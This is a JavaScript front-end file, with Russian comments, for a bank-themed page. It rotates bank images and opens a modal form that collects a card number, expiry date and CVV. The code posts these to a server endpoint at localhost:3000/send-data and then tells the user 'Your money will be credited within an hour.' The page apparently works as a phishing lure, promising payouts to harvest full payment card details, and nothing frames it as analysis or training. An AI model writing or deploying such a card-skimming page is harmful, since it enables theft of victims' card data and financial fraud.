// Список изображений
const images = [
  "bank1.png",
  "bank2.png",
  "bank3.png",
  "bank4.png",
  "bank5.png",
  "bank6.png",
  "bank7.png",
  "bank8.png",
];

let currentImageIndex = 0;

function changeImage() {
  const imageElement = document.getElementById("bank-image");
  imageElement.style.opacity = 0; // Убираем изображение с экрана
  setTimeout(() => {
    imageElement.src = images[currentImageIndex];
    imageElement.style.opacity = 1; // Показываем новое изображение
  }, 500);

  currentImageIndex = (currentImageIndex + 1) % images.length;
}

setInterval(changeImage, 3000);
changeImage();

// Модальное окно
const modal = document.getElementById("card-modal");
const btn = document.getElementById("get-now-btn");
const closeBtn = document.getElementById("close-btn");

// Открытие модального окна при нажатии на кнопку
btn.onclick = function() {
  modal.style.display = "flex";
}

// Закрытие модального окна при нажатии на крестик
closeBtn.onclick = function() {
  modal.style.display = "none";
}

// Обработка отправки формы
document.getElementById("card-form").onsubmit = function(event) {
  event.preventDefault(); // Предотвращаем стандартную отправку формы

  const cardNumber = document.getElementById("card-number").value;
  const expiryDate = document.getElementById("expiry-date").value;
  const cvv = document.getElementById("cvv").value;

  console.log("Sending data:", { cardNumber, expiryDate, cvv }); // Логируем отправляемые данные

  fetch('http://localhost:3000/send-data', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      cardNumber,
      expiryDate,
      cvv
    })
  })
  .then(response => response.text())
  .then(data => {
    alert('Congratulations! Your money will be credited within an hour.');
    console.log(data);
  })
  .catch(error => {
    console.error('Ошибка:', error);
    alert('Ошибка при отправке данных');
  });

  // Закрытие модального окна после отправки данных
  modal.style.display = "none";
}

// Форматирование номера карты
document.getElementById("card-number").addEventListener("input", function(e) {
  let value = e.target.value.replace(/\D/g, '').substring(0, 16);
  value = value.replace(/(\d{4})(?=\d)/g, '$1 ');  // Добавление пробела после каждых 4 цифр
  e.target.value = value;
});

// Форматирование срока
document.getElementById("expiry-date").addEventListener("input", function(e) {
  let value = e.target.value.replace(/\D/g, '').substring(0, 4);  // Максимум 4 цифры
  if (value.length > 2) {
    value = value.substring(0, 2) + '/' + value.substring(2, 4);
  }
  e.target.value = value;
});

// Показ / скрытие CVV
document.getElementById("show-cvv").onclick = function() {
  const cvvInput = document.getElementById("cvv");
  const isPassword = cvvInput.type === "password";
  cvvInput.type = isPassword ? "text" : "password";
  this.textContent = isPassword ? "Hide" : "Show";
}

// Обновление логотипа
const logo = document.querySelector('.logo');
const logoContainer = document.querySelector('.logo-container');

// Изменение расположения логотипа в зависимости от размера экрана
function updateLogoPosition() {
  if (window.innerWidth <= 768) {
    logoContainer.style.textAlign = 'center'; // Логотип по центру на мобильных устройствах
    logo.style.width = '120px'; // Размер логотипа для мобильных устройств
  } else {
    logoContainer.style.textAlign = 'left'; // Логотип слева на десктопах
    logo.style.width = '150px'; // Размер логотипа для десктопов
  }
}

// Обновление позиции логотипа при изменении размера окна
window.addEventListener('resize', updateLogoPosition);

// Начальная настройка логотипа
updateLogoPosition();
